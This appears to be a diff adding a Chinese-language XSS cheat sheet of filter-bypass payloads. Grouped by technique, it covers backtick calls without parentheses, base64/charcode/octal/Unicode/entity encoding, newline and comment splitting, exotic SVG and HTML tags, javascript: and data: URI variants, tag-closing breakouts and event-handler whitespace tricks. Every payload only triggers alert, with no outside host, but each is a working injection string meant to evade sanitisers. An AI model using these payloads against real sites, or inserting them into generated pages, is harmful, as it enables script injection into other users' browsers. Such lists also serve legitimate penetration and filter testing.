@@ -1,0 +1,106 @@
+# 奇葩 XSS - 骚操作绕过
+# 无括号
+<script>alert`1`</script>
+<script>onerror=alert;throw 1</script>
+<script>{onerror=alert}throw 1</script>
+<script>throw onerror=alert,1</script>
+<script>Promise.reject`1`.catch(alert)</script>
+<script>[].find(alert)</script>
+<script>[1].map(alert)</script>
+<script>[1].filter(alert)</script>
+<script>[1].forEach(alert)</script>
+<script>[1].reduce(alert)</script>
+
+# 无引号无括号
+<img src=x onerror=alert`1`>
+<svg onload=alert`1`>
+<body onload=alert`1`>
+
+# 编码绕过
+<script>eval(atob`YWxlcnQoMSk=`)</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<img src=x onerror=eval(atob`YWxlcnQoMSk=`)>
+
+# Unicode 绕过
+<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
+<script>\u{61}\u{6c}\u{65}\u{72}\u{74}(1)</script>
+
+# 八进制
+<script>eval('\141\154\145\162\164\50\61\51')</script>
+
+# HTML 实体
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
+<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
+
+# 换行绕过
+<img src=x one
+rror=alert(1)>
+<script>al
+ert(1)</script>
+
+# 注释绕过
+<script>/**/alert/**/(/XSS/)</script>
+<!--<script>alert(1)//-->
+
+# 特殊标签
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><set onbegin=alert(1) attributename=x to=1>
+<math><maction actiontype=statusline#http://x xlink:href=javascript:alert(1)>X
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<meter onmouseover=alert(1)>0</meter>
+<keygen onfocus=alert(1) autofocus>
+
+# SVG 骚操作
+<svg><script>alert&lpar;1&rpar;</script>
+<svg><script>&#97;&#108;&#101;&#114;&#116;(1)</script>
+<svg/onload=alert(1)>
+<svg	onload=alert(1)>
+<svg
+onload=alert(1)>
+
+# 伪协议变体
+javascript:alert(1)
+javascript://%0aalert(1)
+javascript://comment%0aalert(1)
+java%0ascript:alert(1)
+java%09script:alert(1)
+java%0dscript:alert(1)
+
+# data URI
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+data:image/svg+xml,<svg onload=alert(1)>
+data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+
+
+# 闭合绕过
+</script><script>alert(1)</script>
+</title><script>alert(1)</script>
+</style><script>alert(1)</script>
+</textarea><script>alert(1)</script>
+</noscript><script>alert(1)</script>
+--><script>alert(1)</script>
+]]><script>alert(1)</script>
+
+# 事件处理器变体
+<body/onload=alert(1)>
+<body	onload=alert(1)>
+<body
+onload=alert(1)>
+<body onload	=alert(1)>
+<body onload
+=alert(1)>
+<body onload=	alert(1)>
+
+# 特殊字符
+<img src=x onerror=alert(1)//
+<img src=x onerror=alert(1)/*
+<img src=x onerror=alert(1)<!
+<img src=x onerror=alert(1)<?
+
+# 模板字符串
+<script>alert`document.domain`</script>
+<script>${alert(1)}</script>
+
+# 原型链污染
+<script>Object.prototype.innerHTML='<img src=x onerror=alert(1)>'</script>
